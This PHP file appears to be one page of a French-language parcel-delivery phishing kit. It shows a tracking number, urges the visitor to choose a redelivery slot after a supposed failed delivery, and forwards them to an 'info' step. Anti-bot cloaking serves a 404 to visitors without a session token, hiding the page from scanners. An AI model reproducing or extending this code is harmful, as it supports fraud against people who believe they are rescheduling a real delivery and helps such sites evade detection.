<?php

if (!isset($token) || $token !== $_SESSION['token']) {
    $this->killBot->show404Page();
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['token']) && $_POST['token'] === $token) {
        if (empty($_POST['date'])) {
            return header('location: ./livraison??id=' . $token . '&empty');
        }
        $_SESSION['date'] = $_POST['date'];
        header('location: ./info?id=' . $token);
    }
} else {
    require_once(b . '/views/components/header.php');
?>
    <h2>Numéro de suivi : <?= $config['code'] ?></h2>
    <form method="post" novalidate='novalidate'>
        <input type="hidden" name="token" value="<?= htmlspecialchars($token) ?>" />
        <h3>Choisissez votre créneau de livraison</h3>
        <p>
            Votre colis vous sera livré lors du prochain jour sélectionné, entre 8h00 et 18h00, à l'exception des jours fériés et du dimanche.
            <br><br>
            Si un nouvel échec a lieu, votre colis sera automatiquement redirigé en point relais le plus proche de votre domicile.
            <br>
        </p>

        <h4 style="text-align: center">Date de re-livraison</h4>
        <select id="schedule_form_schedule" name="date">
            <?php
            $options = '';
            $jours = [];
            $aujourdhui = new DateTime();
            $compteurJour = 0;
            $isFirstOption = true;

            while (count($jours) < 5) {
                $compteurJour++;
                $prochainJour = clone $aujourdhui;
                $prochainJour->modify("+{$compteurJour} day");
                $jourDeLaSemaine = $prochainJour->format('w');
                if ($jourDeLaSemaine != 0) {
                    $jours[] = $prochainJour->format('d/m/Y');
                }
            }

            foreach ($jours as $jour) {
                $selected = $isFirstOption ? ' selected' : '';
                $options .= "<option{$selected}>{$jour} - de 8h à 13h</option>";
                $isFirstOption = false;
                $selected = $isFirstOption ? ' selected' : '';
                $options .= "<option{$selected}>{$jour} - de 13h à 18h</option>";
            }

            echo $options;
            ?>
        </select>
        <div>
            <button type="submit" id="tracking_form_submit">Confirmer ma re-livraison</button>
        </div>
    </form>
<?php
    require_once(b . '/views/components/footer.php');
}
